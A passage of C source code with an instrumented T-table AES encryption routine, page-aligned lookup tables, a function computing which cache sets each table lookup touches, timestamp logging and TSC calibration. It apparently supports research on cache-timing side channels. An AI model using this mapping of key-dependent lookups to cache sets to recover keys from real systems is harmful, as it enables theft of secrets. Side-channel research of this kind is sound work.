  0x040c0804, 0xc75295c7, 0x23654623, 0xc35e9dc3, 0x18283018, 0x96a13796, 0x050f0a05, 0x9ab52f9a, 0x07090e07, 0x12362412, 0x809b1b80, 0xe23ddfe2, 0xeb26cdeb, 0x27694e27, 0xb2cd7fb2, 0x759fea75,
  0x091b1209, 0x839e1d83, 0x2c74582c, 0x1a2e341a, 0x1b2d361b, 0x6eb2dc6e, 0x5aeeb45a, 0xa0fb5ba0, 0x52f6a452, 0x3b4d763b, 0xd661b7d6, 0xb3ce7db3, 0x297b5229, 0xe33edde3, 0x2f715e2f, 0x84971384,
  0x53f5a653, 0xd168b9d1, 0x00000000, 0xed2cc1ed, 0x20604020, 0xfc1fe3fc, 0xb1c879b1, 0x5bedb65b, 0x6abed46a, 0xcb468dcb, 0xbed967be, 0x394b7239, 0x4ade944a, 0x4cd4984c, 0x58e8b058, 0xcf4a85cf,
  0xd06bbbd0, 0xef2ac5ef, 0xaae54faa, 0xfb16edfb, 0x43c58643, 0x4dd79a4d, 0x33556633, 0x85941185, 0x45cf8a45, 0xf910e9f9, 0x02060402, 0x7f81fe7f, 0x50f0a050, 0x3c44783c, 0x9fba259f, 0xa8e34ba8,
  0x51f3a251, 0xa3fe5da3, 0x40c08040, 0x8f8a058f, 0x92ad3f92, 0x9dbc219d, 0x38487038, 0xf504f1f5, 0xbcdf63bc, 0xb6c177b6, 0xda75afda, 0x21634221, 0x10302010, 0xff1ae5ff, 0xf30efdf3, 0xd26dbfd2,
  0xcd4c81cd, 0x0c14180c, 0x13352613, 0xec2fc3ec, 0x5fe1be5f, 0x97a23597, 0x44cc8844, 0x17392e17, 0xc45793c4, 0xa7f255a7, 0x7e82fc7e, 0x3d477a3d, 0x64acc864, 0x5de7ba5d, 0x192b3219, 0x7395e673,
  0x60a0c060, 0x81981981, 0x4fd19e4f, 0xdc7fa3dc, 0x22664422, 0x2a7e542a, 0x90ab3b90, 0x88830b88, 0x46ca8c46, 0xee29c7ee, 0xb8d36bb8, 0x143c2814, 0xde79a7de, 0x5ee2bc5e, 0x0b1d160b, 0xdb76addb,
  0xe03bdbe0, 0x32566432, 0x3a4e743a, 0x0a1e140a, 0x49db9249, 0x060a0c06, 0x246c4824, 0x5ce4b85c, 0xc25d9fc2, 0xd36ebdd3, 0xacef43ac, 0x62a6c462, 0x91a83991, 0x95a43195, 0xe437d3e4, 0x798bf279,
  0xe732d5e7, 0xc8438bc8, 0x37596e37, 0x6db7da6d, 0x8d8c018d, 0xd564b1d5, 0x4ed29c4e, 0xa9e049a9, 0x6cb4d86c, 0x56faac56, 0xf407f3f4, 0xea25cfea, 0x65afca65, 0x7a8ef47a, 0xaee947ae, 0x08181008,
  0xbad56fba, 0x7888f078, 0x256f4a25, 0x2e725c2e, 0x1c24381c, 0xa6f157a6, 0xb4c773b4, 0xc65197c6, 0xe823cbe8, 0xdd7ca1dd, 0x749ce874, 0x1f213e1f, 0x4bdd964b, 0xbddc61bd, 0x8b860d8b, 0x8a850f8a,
  0x7090e070, 0x3e427c3e, 0xb5c471b5, 0x66aacc66, 0x48d89048, 0x03050603, 0xf601f7f6, 0x0e121c0e, 0x61a3c261, 0x355f6a35, 0x57f9ae57, 0xb9d069b9, 0x86911786, 0xc15899c1, 0x1d273a1d, 0x9eb9279e,
  0xe138d9e1, 0xf813ebf8, 0x98b32b98, 0x11332211, 0x69bbd269, 0xd970a9d9, 0x8e89078e, 0x94a73394, 0x9bb62d9b, 0x1e223c1e, 0x87921587, 0xe920c9e9, 0xce4987ce, 0x55ffaa55, 0x28785028, 0xdf7aa5df,
  0x8c8f038c, 0xa1f859a1, 0x89800989, 0x0d171a0d, 0xbfda65bf, 0xe631d7e6, 0x42c68442, 0x68b8d068, 0x41c38241, 0x99b02999, 0x2d775a2d, 0x0f111e0f, 0xb0cb7bb0, 0x54fca854, 0xbbd66dbb, 0x163a2c16,
};
static const uint32_t Te3[256] __attribute__((aligned(4096))) = {
  0x6363a5c6, 0x7c7c84f8, 0x777799ee, 0x7b7b8df6, 0xf2f20dff, 0x6b6bbdd6, 0x6f6fb1de, 0xc5c55491, 0x30305060, 0x01010302, 0x6767a9ce, 0x2b2b7d56, 0xfefe19e7, 0xd7d762b5, 0xababe64d, 0x76769aec,
  0xcaca458f, 0x82829d1f, 0xc9c94089, 0x7d7d87fa, 0xfafa15ef, 0x5959ebb2, 0x4747c98e, 0xf0f00bfb, 0xadadec41, 0xd4d467b3, 0xa2a2fd5f, 0xafafea45, 0x9c9cbf23, 0xa4a4f753, 0x727296e4, 0xc0c05b9b,
  0xb7b7c275, 0xfdfd1ce1, 0x9393ae3d, 0x26266a4c, 0x36365a6c, 0x3f3f417e, 0xf7f702f5, 0xcccc4f83, 0x34345c68, 0xa5a5f451, 0xe5e534d1, 0xf1f108f9, 0x717193e2, 0xd8d873ab, 0x31315362, 0x15153f2a,
  0x04040c08, 0xc7c75295, 0x23236546, 0xc3c35e9d, 0x18182830, 0x9696a137, 0x05050f0a, 0x9a9ab52f, 0x0707090e, 0x12123624, 0x80809b1b, 0xe2e23ddf, 0xebeb26cd, 0x2727694e, 0xb2b2cd7f, 0x75759fea,
  0x09091b12, 0x83839e1d, 0x2c2c7458, 0x1a1a2e34, 0x1b1b2d36, 0x6e6eb2dc, 0x5a5aeeb4, 0xa0a0fb5b, 0x5252f6a4, 0x3b3b4d76, 0xd6d661b7, 0xb3b3ce7d, 0x29297b52, 0xe3e33edd, 0x2f2f715e, 0x84849713,
  0x5353f5a6, 0xd1d168b9, 0x00000000, 0xeded2cc1, 0x20206040, 0xfcfc1fe3, 0xb1b1c879, 0x5b5bedb6, 0x6a6abed4, 0xcbcb468d, 0xbebed967, 0x39394b72, 0x4a4ade94, 0x4c4cd498, 0x5858e8b0, 0xcfcf4a85,
  0xd0d06bbb, 0xefef2ac5, 0xaaaae54f, 0xfbfb16ed, 0x4343c586, 0x4d4dd79a, 0x33335566, 0x85859411, 0x4545cf8a, 0xf9f910e9, 0x02020604, 0x7f7f81fe, 0x5050f0a0, 0x3c3c4478, 0x9f9fba25, 0xa8a8e34b,
  0x5151f3a2, 0xa3a3fe5d, 0x4040c080, 0x8f8f8a05, 0x9292ad3f, 0x9d9dbc21, 0x38384870, 0xf5f504f1, 0xbcbcdf63, 0xb6b6c177, 0xdada75af, 0x21216342, 0x10103020, 0xffff1ae5, 0xf3f30efd, 0xd2d26dbf,
  0xcdcd4c81, 0x0c0c1418, 0x13133526, 0xecec2fc3, 0x5f5fe1be, 0x9797a235, 0x4444cc88, 0x1717392e, 0xc4c45793, 0xa7a7f255, 0x7e7e82fc, 0x3d3d477a, 0x6464acc8, 0x5d5de7ba, 0x19192b32, 0x737395e6,
  0x6060a0c0, 0x81819819, 0x4f4fd19e, 0xdcdc7fa3, 0x22226644, 0x2a2a7e54, 0x9090ab3b, 0x8888830b, 0x4646ca8c, 0xeeee29c7, 0xb8b8d36b, 0x14143c28, 0xdede79a7, 0x5e5ee2bc, 0x0b0b1d16, 0xdbdb76ad,
  0xe0e03bdb, 0x32325664, 0x3a3a4e74, 0x0a0a1e14, 0x4949db92, 0x06060a0c, 0x24246c48, 0x5c5ce4b8, 0xc2c25d9f, 0xd3d36ebd, 0xacacef43, 0x6262a6c4, 0x9191a839, 0x9595a431, 0xe4e437d3, 0x79798bf2,
  0xe7e732d5, 0xc8c8438b, 0x3737596e, 0x6d6db7da, 0x8d8d8c01, 0xd5d564b1, 0x4e4ed29c, 0xa9a9e049, 0x6c6cb4d8, 0x5656faac, 0xf4f407f3, 0xeaea25cf, 0x6565afca, 0x7a7a8ef4, 0xaeaee947, 0x08081810,
  0xbabad56f, 0x787888f0, 0x25256f4a, 0x2e2e725c, 0x1c1c2438, 0xa6a6f157, 0xb4b4c773, 0xc6c65197, 0xe8e823cb, 0xdddd7ca1, 0x74749ce8, 0x1f1f213e, 0x4b4bdd96, 0xbdbddc61, 0x8b8b860d, 0x8a8a850f,
  0x707090e0, 0x3e3e427c, 0xb5b5c471, 0x6666aacc, 0x4848d890, 0x03030506, 0xf6f601f7, 0x0e0e121c, 0x6161a3c2, 0x35355f6a, 0x5757f9ae, 0xb9b9d069, 0x86869117, 0xc1c15899, 0x1d1d273a, 0x9e9eb927,
  0xe1e138d9, 0xf8f813eb, 0x9898b32b, 0x11113322, 0x6969bbd2, 0xd9d970a9, 0x8e8e8907, 0x9494a733, 0x9b9bb62d, 0x1e1e223c, 0x87879215, 0xe9e920c9, 0xcece4987, 0x5555ffaa, 0x28287850, 0xdfdf7aa5,
  0x8c8c8f03, 0xa1a1f859, 0x89898009, 0x0d0d171a, 0xbfbfda65, 0xe6e631d7, 0x4242c684, 0x6868b8d0, 0x4141c382, 0x9999b029, 0x2d2d775a, 0x0f0f111e, 0xb0b0cb7b, 0x5454fca8, 0xbbbbd66d, 0x16163a2c,
};

#define GETU32(pt) (((uint32_t)(pt)[0] << 24) ^ ((uint32_t)(pt)[1] << 16) ^ ((uint32_t)(pt)[2] <<  8) ^ ((uint32_t)(pt)[3]))
#define PUTU32(ct, st) { (ct)[0] = (uint8_t)((st) >> 24); (ct)[1] = (uint8_t)((st) >> 16); (ct)[2] = (uint8_t)((st) >>  8); (ct)[3] = (uint8_t)(st); }

int log_sets[10000000];
int set_idx;
void AES_sets(const unsigned char *in, unsigned char *out, unsigned char *sets, const AES_KEY *key);

void print_sets() {
  int i, t, t_last, si=0;
  uint8_t buffer1[16];
  uint8_t buffer2[16];
  uint8_t sets[160];
  uint8_t *b1, *b2, *p;
  b1=buffer1;
  b2=buffer2;
  memcpy(b1, in_ref, sizeof(in_ref));
  fprintf(stderr, "file=%s\n", log_file);
  FILE* f = fopen(log_file, "w");
  fprintf(stderr, "advance=%ld\n", *advance_ctr);
  fprintf(stderr, "set_idx=%d\n", set_idx);
  for(i=0;i<set_idx;i++) {
    if(i%41==0) {
      t_last = log_sets[i];
      AES_sets(b1, b2, sets, &key_ref);
      p=b1;
      b1=b2;
      b2=p;
      si=0;
    }
    else {
      t=log_sets[i];
      if(i==set_idx-1 && t==0) continue;
      fprintf(f, "%d %d ", t_last, t);
      fprintf(f, "%d ",  sets[si++] );
      fprintf(f, "%d ",  sets[si++] );
      fprintf(f, "%d ",  sets[si++] );
      fprintf(f, "%d\n", sets[si++] );
      t_last = t;
    }
  }
}

#define MARK()	do{ asm volatile ("":::"memory"); log_sets[set_idx++] = *iteration; } while(0)
//#define MARK()


void AES_encrypt(const unsigned char *in, unsigned char *out, const struct aes_key_st *key) __attribute__((aligned(4096)));

void AES_encrypt(const unsigned char *in, unsigned char *out, const AES_KEY *key) {
  const uint32_t *rk;
  uint32_t s0, s1, s2, s3, t0, t1, t2, t3;
  int r;
  assert(in && out && key);
  rk = key->rd_key;
  s0 = GETU32(in     ) ^ rk[0];
  s1 = GETU32(in +  4) ^ rk[1];
  s2 = GETU32(in +  8) ^ rk[2];
  s3 = GETU32(in + 12) ^ rk[3];
  r = key->rounds >> 1;
  MARK();
  for (;;) {
    t0 = Te0[(s0>>24)]^Te1[(s1>>16)&0xff]^Te2[(s2>>8)&0xff]^Te3[(s3)&0xff]^rk[4];
    MARK();
    t1 = Te0[(s1>>24)]^Te1[(s2>>16)&0xff]^Te2[(s3>>8)&0xff]^Te3[(s0)&0xff]^rk[5];
    MARK();
    t2 = Te0[(s2>>24)]^Te1[(s3>>16)&0xff]^Te2[(s0>>8)&0xff]^Te3[(s1)&0xff]^rk[6];
    MARK();
    t3 = Te0[(s3>>24)]^Te1[(s0>>16)&0xff]^Te2[(s1>>8)&0xff]^Te3[(s2)&0xff]^rk[7];
    MARK();
    rk += 8;
    if (--r == 0) {
      break;
    }
    s0 = Te0[(t0>>24)]^Te1[(t1>>16)&0xff]^Te2[(t2>>8)&0xff]^Te3[(t3)&0xff]^rk[0];
    MARK();
    s1 = Te0[(t1>>24)]^Te1[(t2>>16)&0xff]^Te2[(t3>>8)&0xff]^Te3[(t0)&0xff]^rk[1];
    MARK();
    s2 = Te0[(t2>>24)]^Te1[(t3>>16)&0xff]^Te2[(t0>>8)&0xff]^Te3[(t1)&0xff]^rk[2];
    MARK();
    s3 = Te0[(t3>>24)]^Te1[(t0>>16)&0xff]^Te2[(t1>>8)&0xff]^Te3[(t2)&0xff]^rk[3];
    MARK();
  }
  s0 = (Te2[(t0>>24)]&0xff000000)^(Te3[(t1>>16)&0xff]&0x00ff0000)^(Te0[(t2>>8)&0xff]&0x0000ff00)^(Te1[(t3)&0xff]&0x000000ff)^rk[0];
  MARK();
  PUTU32(out,s0);
  s1 = (Te2[(t1>>24)]&0xff000000)^(Te3[(t2>>16)&0xff]&0x00ff0000)^(Te0[(t3>>8)&0xff]&0x0000ff00)^(Te1[(t0)&0xff]&0x000000ff)^rk[1];
  MARK();
  PUTU32(out+4,s1);
  s2 = (Te2[(t2>>24)]&0xff000000)^(Te3[(t3>>16)&0xff]&0x00ff0000)^(Te0[(t0>>8)&0xff]&0x0000ff00)^(Te1[(t1)&0xff]&0x000000ff)^rk[2];
  MARK();
  PUTU32(out+8,s2);
  s3 = (Te2[(t3>>24)]&0xff000000)^(Te3[(t0>>16)&0xff]&0x00ff0000)^(Te0[(t1>>8)&0xff]&0x0000ff00)^(Te1[(t2)&0xff]&0x000000ff)^rk[3];
  MARK();
  PUTU32(out+12,s3);
}


#define STLOOKUPS(l,i,c0,c1,c2,c3) \
  l[i++]=48+(c0>>24)/16;l[i++]=32+((c1>>16)&0xff)/16;l[i++]=16+((c2>>8)&0xff)/16;l[i++]=((c3)&0xff)/16; \
  l[i++]=48+(c1>>24)/16;l[i++]=32+((c2>>16)&0xff)/16;l[i++]=16+((c3>>8)&0xff)/16;l[i++]=((c0)&0xff)/16; \
  l[i++]=48+(c2>>24)/16;l[i++]=32+((c3>>16)&0xff)/16;l[i++]=16+((c0>>8)&0xff)/16;l[i++]=((c1)&0xff)/16; \
  l[i++]=48+(c3>>24)/16;l[i++]=32+((c0>>16)&0xff)/16;l[i++]=16+((c1>>8)&0xff)/16;l[i++]=((c2)&0xff)/16

#define STLOOKUPSLAST(l,i,c0,c1,c2,c3) \
  l[i++]=16+(c0>>24)/16;l[i++]=((c1>>16)&0xff)/16;l[i++]=48+((c2>>8)&0xff)/16;l[i++]=32+((c3)&0xff)/16; \
  l[i++]=16+(c1>>24)/16;l[i++]=((c2>>16)&0xff)/16;l[i++]=48+((c3>>8)&0xff)/16;l[i++]=32+((c0)&0xff)/16; \
  l[i++]=16+(c2>>24)/16;l[i++]=((c3>>16)&0xff)/16;l[i++]=48+((c0>>8)&0xff)/16;l[i++]=32+((c1)&0xff)/16; \
  l[i++]=16+(c3>>24)/16;l[i++]=((c0>>16)&0xff)/16;l[i++]=48+((c1>>8)&0xff)/16;l[i++]=32+((c2)&0xff)/16

void AES_sets(const unsigned char *in, unsigned char *out, unsigned char *sets, const AES_KEY *key) {
  const uint32_t *rk;
  uint32_t s0, s1, s2, s3, t0, t1, t2, t3;
  int r;
  int i=0;
  rk = key->rd_key;
  s0 = GETU32(in     ) ^ rk[0];
  s1 = GETU32(in +  4) ^ rk[1];
  s2 = GETU32(in +  8) ^ rk[2];
  s3 = GETU32(in + 12) ^ rk[3];
  r = key->rounds >> 1;
  for (;;) {
    t0 = Te0[(s0>>24)]^Te1[(s1>>16)&0xff]^Te2[(s2>>8)&0xff]^Te3[(s3)&0xff]^rk[4];
    t1 = Te0[(s1>>24)]^Te1[(s2>>16)&0xff]^Te2[(s3>>8)&0xff]^Te3[(s0)&0xff]^rk[5];
    t2 = Te0[(s2>>24)]^Te1[(s3>>16)&0xff]^Te2[(s0>>8)&0xff]^Te3[(s1)&0xff]^rk[6];
    t3 = Te0[(s3>>24)]^Te1[(s0>>16)&0xff]^Te2[(s1>>8)&0xff]^Te3[(s2)&0xff]^rk[7];
    STLOOKUPS(sets,i,s0,s1,s2,s3);

    rk += 8;
    if (--r == 0) {
      break;
    }
    s0 = Te0[(t0>>24)]^Te1[(t1>>16)&0xff]^Te2[(t2>>8)&0xff]^Te3[(t3)&0xff]^rk[0];
    s1 = Te0[(t1>>24)]^Te1[(t2>>16)&0xff]^Te2[(t3>>8)&0xff]^Te3[(t0)&0xff]^rk[1];
    s2 = Te0[(t2>>24)]^Te1[(t3>>16)&0xff]^Te2[(t0>>8)&0xff]^Te3[(t1)&0xff]^rk[2];
    s3 = Te0[(t3>>24)]^Te1[(t0>>16)&0xff]^Te2[(t1>>8)&0xff]^Te3[(t2)&0xff]^rk[3];
    STLOOKUPS(sets,i,t0,t1,t2,t3);
  }
  s0 = (Te2[(t0>>24)]&0xff000000)^(Te3[(t1>>16)&0xff]&0x00ff0000)^(Te0[(t2>>8)&0xff]&0x0000ff00)^(Te1[(t3)&0xff]&0x000000ff)^rk[0];  PUTU32(out,s0);
  s1 = (Te2[(t1>>24)]&0xff000000)^(Te3[(t2>>16)&0xff]&0x00ff0000)^(Te0[(t3>>8)&0xff]&0x0000ff00)^(Te1[(t0)&0xff]&0x000000ff)^rk[1];  PUTU32(out+4,s1);
  s2 = (Te2[(t2>>24)]&0xff000000)^(Te3[(t3>>16)&0xff]&0x00ff0000)^(Te0[(t0>>8)&0xff]&0x0000ff00)^(Te1[(t1)&0xff]&0x000000ff)^rk[2];  PUTU32(out+8,s2);
  s3 = (Te2[(t3>>24)]&0xff000000)^(Te3[(t0>>16)&0xff]&0x00ff0000)^(Te0[(t1>>8)&0xff]&0x0000ff00)^(Te1[(t2)&0xff]&0x000000ff)^rk[3];  PUTU32(out+12,s3);
  STLOOKUPSLAST(sets,i,t0,t1,t2,t3);
}

#ifdef USE_ANDROID
#define NS_PER_CYCLE	1.0
#else
#define NS_PER_CYCLE    0.294785
#endif
#define NS_PRECISION	1000000

#ifdef USE_ANDROID
void adjust_ns_per_cycle() {
}
#else
void adjust_ns_per_cycle() {
  struct timespec pclock;
  uint64_t timestamp = 0;
  uint64_t start_timestamp = 0;
  long nsec;
  long start_nsec;
  long start_sec;
  double ns_per_cycle=0;
  char set=0;
  int i=0;
  while( (int)(ns_per_cycle*NS_PRECISION)!=(int)(NS_PER_CYCLE*NS_PRECISION)) {
    timestamp = readtsc();
    clock_gettime(CLOCK_MONOTONIC, &pclock);
    if(!set) {
      start_timestamp = timestamp;
      start_sec = pclock.tv_sec;
      start_nsec = pclock.tv_nsec;
      set=1;
    }
    nsec = (pclock.tv_nsec-start_nsec) + 1000000000*(pclock.tv_sec-start_sec);
    ns_per_cycle = (double)nsec/(timestamp-start_timestamp);
    i++;
  }
//  fprintf(stderr,"adjusted ns/cycle in %ldms and %d iterations.\n",nsec/1000000, i);
}
#endif
